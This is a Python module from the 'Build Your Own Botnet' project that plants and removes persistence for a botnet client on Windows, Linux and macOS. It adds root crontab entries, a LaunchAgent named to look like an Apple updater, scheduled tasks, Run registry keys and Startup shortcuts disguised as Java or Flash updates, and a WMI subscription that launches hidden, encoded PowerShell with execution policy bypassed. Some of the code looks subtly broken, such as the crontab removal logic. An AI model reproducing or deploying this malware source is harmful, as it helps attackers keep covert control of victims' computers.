#!/usr/bin/python
# -*- coding: utf-8 -*-
'Persistence (Build Your Own Botnet)'

# standard libarary
import os
import sys
import time
import base64
import random
import string
import subprocess

# packages
if sys.platform == 'win32':
    import _winreg

# utilities
import util

# globals
packages = ['_winreg'] if sys.platform == 'win32' else []
platforms = ['win32','linux','darwin']
results = {}
usage = 'persistence [method] <add/remove>'
description = """
Establish persistence on the client host machine
with multiple methods to ensure redundancy
"""

# templates
template_wmi = string.Template("""$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ${STARTUP}"
$filter.Name = "${NAME}"
$filter.EventNamespace = 'root\\cimv2'
$result = $filter.Put()
$filterPath = $result.Path
$consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = '${NAME}'
$consumer.CommandLineTemplate = '${COMMAND_LINE}'
$consumer.ExecutablePath = ""
$consumer.WorkingDirectory = "C:\\Windows\\System32"
$result = $consumer.Put()
$consumerPath = $result.Path
$bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
$bind.Filter = $filterPath
$bind.Consumer = $consumerPath
$result = $bind.Put()
$bindPath = $result.Path""")

template_plist = string.Template("""#!/bin/bash
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>${LABEL}</string>
<key>ProgramArguments</key>
<array>
<string>/usr/bin/python</string>
<string>${FILE}</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>180</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/${LABEL}.plist
chmod 600 ~/Library/LaunchAgents/${LABEL}.plist
launchctl load ~/Library/LaunchAgents/${LABEL}.plist
exit""")

# main
class Method():
    """
    Persistence Method (Build Your Own Botnet)

    """
    def __init__(self, name, platforms=['win32','linux','linux2','darwin']):
        self.name = name
        self.result = None
        self.established = False
        self.platforms = platforms
        [util.__logger__.warn("required method '_{}_{}' not found".format(_, self.name)) for _ in ('add','remove') if '_{}_{}'.format(_, self.name) not in globals()]

    def add(self):
        """
        Attempt to establish persistence using the given method

        """
        if sys.platform in self.platforms:
            if not self.established:
                self.established, self.result = globals()['_add_{}'.format(self.name)]()
        else:
            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))

    def remove(self):
        """
        Remove an established persistence method from the host machine

        """
        if sys.platform in self.platforms:
            if self.established:
                self.established, self.result = globals()['_remove_{}'.format(self.name)]()
        else:
            raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))

def _add_hidden_file(value=None):
    try:
        value = sys.argv[0]
        if value and os.path.isfile(value):
            if os.name == 'nt':
                path = value
                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
            else:
                dirname, basename = os.path.split(value)
                path = os.path.join(dirname, '.' + basename)
                hide = subprocess.call('cp {} {}'.format(value, path), shell=True) == 0
            return (True if hide else False, path)
        else:
            util.log("File '{}' not found".format(value))
    except Exception as e:
        util.log(e)
    return (False, None)

def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
    try:
        if 'linux' in sys.platform:
            value = os.path.abspath(sys.argv[0])
            if value and os.path.isfile(value):
                if not _methods['crontab_job'].established:
                    path = value
                    task = "0 * * * * root {}".format(path)
                    with open('/etc/crontab', 'r') as fp:
                        data = fp.read()
                    if task not in data:
                        with open('/etc/crontab', 'a') as fd:
                            fd.write('\n{}\n'.format(task))
                    return (True, path)
                else:
                    return (True, path)
    except Exception as e:
        util.log("{} error: {}".format(_add_crontab_job.__name__, str(e)))
    return (False, None)

def _add_launch_agent(value=None, name='com.apple.update.manager'):
    try:
        global template_plist
        if sys.platform == 'darwin':
            if not value:
                if len(sys.argv):
                    value = sys.argv[0]
                elif '__file__' in globals():
                    value = globals().get('__file__')
                else:
                    raise ValueError('No target file selected')
            if value and os.path.isfile(value):
                label = name
                if not os.path.exists('/var/tmp'):
                    os.makedirs('/var/tmp')
                fpath = '/var/tmp/.{}.sh'.format(name)
                bash = template_plist.substitute(LABEL=label, FILE=value)
                with open(fpath, 'w') as fileobj:
                    fileobj.write(bash)
                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                time.sleep(1)
                launch_agent= os.path.join(os.environ.get('HOME'), 'Library/LaunchAgents/{}.plist'.format(label))
                if os.path.isfile(launch_agent):
                    os.remove(fpath)
                    return (True, launch_agent)
                else:
                    util.log('File {} not found'.format(launch_agent))
    except Exception as e2:
        util.log('Error: {}'.format(str(e2)))
    return (False, None)

def _add_scheduled_task(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['scheduled_task'].established:
            value = sys.argv[0]
            name  = util.variable(random.randint(6,11))
            if value and os.path.isfile(value):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                if 'SUCCESS' in result:
                    return (True, result.replace('"', ''))
    except Exception as e:
        util.log('Add scheduled task error: {}'.format(str(e)))
    return (False, None)

def _add_startup_file(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['startup_file'].established:
            value = sys.argv[0]
            if value and os.path.isfile(value):
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                if not os.path.exists(startup_dir):
                    os.makedirs(startup_dir)
                startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                    with open(startup_file, 'w') as fp:
                        fp.write(content)
                return (True, startup_file)
    except Exception as e:
        util.log('{} error: {}'.format(_add_startup_file.__name__, str(e)))
    return (False, None)

def _add_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['registry_key'].established:
            value = sys.argv[0]
            if value and os.path.isfile(value):
                try:
                    util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                    return (True, name)
                except Exception as e:
                    util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
    except Exception as e:
        util.log('{} error: {}'.format(_add_registry_key.__name__, str(e)))
    return (False, None)

def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
    try:
        global template_wmi
        if os.name == 'nt' and not _methods['powershell_wmi'].established:
            if command:
                cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
                script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
                _ = util.powershell(script)
                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                result = util.powershell(code)
                if name in result:
                    return (True, result)
    except Exception as e:
        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
    return (False, None)

def _remove_scheduled_task():
    if _methods['scheduled_task'].established:
        value = _methods['scheduled_task'].result
        try:
            if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                return (False, None)
        except:
            pass
    return (_methods['scheduled_task'].established, _methods['scheduled_task'].result)

def _remove_hidden_file():
    try:
        if _methods['hidden_file'].established:
            filename = _methods['hidden_file'].result
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name == 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return (False, None)
                except Exception as e1:
                    util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e1)))
    except Exception as e2:
        util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e2)))
    return (_methods['hidden_file'].established, _methods['hidden_file'].result)

def _remove_crontab_job(value=None, name='flashplayer'):
    try:
        if 'linux' in sys.platform and _methods['crontab_job'].established:
            with open('/etc/crontab','r') as fp:
                lines = [i.rstrip() for i in fp.readlines()]
                for line in lines:
                    if name in line:
                        _ = lines.pop(line, None)
            with open('/etc/crontab', 'a+') as fp:
                fp.write('\n'.join(lines))
        return (False, None)
    except Exception as e:
        util.log('{} error: {}'.format(_remove_crontab_job.__name__, str(e)))
    return (_methods['hidden_file'].established, _methods['hidden_file'].result)

def _remove_launch_agent(value=None, name='com.apple.update.manager'):
    try:
        if _methods['launch_agent'].established:
            launch_agent = _methods['launch_agent'].result
            if os.path.isfile(launch_agent):
                util.delete(launch_agent)
                return (False, None)
    except Exception as e:
        util.log("{} error: {}".format(_remove_launch_agent.__name__, str(e)))
    return (_methods['launch_agent'].established, _methods['launch_agent'].result)

def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
    try:
        if _methods['powershell_wmi'].established:
            try:
                code = r"""
                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'",  Remove-WmiObject
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" ,  Remove-WmiObject
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription ,  Where-Object { $_.filter -match '[NAME]'} ,  Remove-WmiObject""".replace('[NAME]', name)
                result = util.powershell(code)
                if not result:
                    return (False, None)
            except: pass
        return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
    except Exception as e:
        util.log('{} error: {}'.format(_add_powershell_wmi.__name__, str(e)))
    return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)

def _remove_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if _methods['registry_key'].established:
            value = _methods['registry_key'].result
            try:
                key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
                _winreg.DeleteValue(key, name)
                _winreg.CloseKey(key)
                return (False, None)
            except: pass
        return (_methods['registry_key'].established, _methods['registry_key'].result)
    except Exception as e:
        util.log(str(e))

def _remove_startup_file():
    try:
        if _methods['startup_file'].established:
            value = _methods['startup_file'].result
            if value and os.path.isfile(value):
                if os.name != 'nt':
                    return (False, None)
                appdata      = os.path.expandvars("%AppData%")
                startup_dir  = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_file = os.path.join(startup_dir, value) + '.eu.url'
                if os.path.exists(startup_file):
                    util.delete(startup_file)
        return (False, None)
    except Exception as e:
        util.log('{} error: {}'.format(_remove_startup_file.__name__, str(e)))

hidden_file = Method('hidden_file', platforms=['win32','linux','linux2','darwin'])
crontab_job = Method('crontab_job', platforms=['linux','linux2'])
registry_key = Method('registry_key', platforms=['win32'])
startup_file = Method('startup_file', platforms=['win32'])
launch_agent = Method('launch_agent', platforms=['darwin'])
scheduled_task = Method('scheduled_task', platforms=['win32'])
powershell_wmi = Method('powershell_wmi', platforms=['win32'])

_methods = {method: globals()[method] for method in globals() if isinstance(globals()[method], Method)}

def methods():
    """
    Persistence methods as dictionary (JSON) object of key-value pairs

    Ex. {"method": <Method-object at 0x098fce>, ...}

    `Method`
    :attr method add:          run the method
    :attr method remove:       remove the method
    :attr str name:            name of the method
    :attr bool established:    True/False if established
    :attr str result:          method result output

    """
    return globals()['_methods'].items()

def results():
    """
    Results of completed persistence methods as dictionary (JSON) object of key-value pairs

    Ex. {"method": "result", ...}

    """
    return {name: method.result for name, method in globals()['_methods'].items() if method.established}

def run():
    """
    Attempt to establish persistence with every method

    """
    for name, method in globals()['_methods'].items():
        if sys.platform in method.platforms:
            try:
                method.add()
            except Exception as e:
                util.log(e)
    return results()

def abort():
    """
    Remove all established persistence methods

    """
    for name, method in globals()['_methods'].items():
        if sys.platform in method.platforms:
            try:
                method.remove()
            except Exception as e:
                util.log(e)
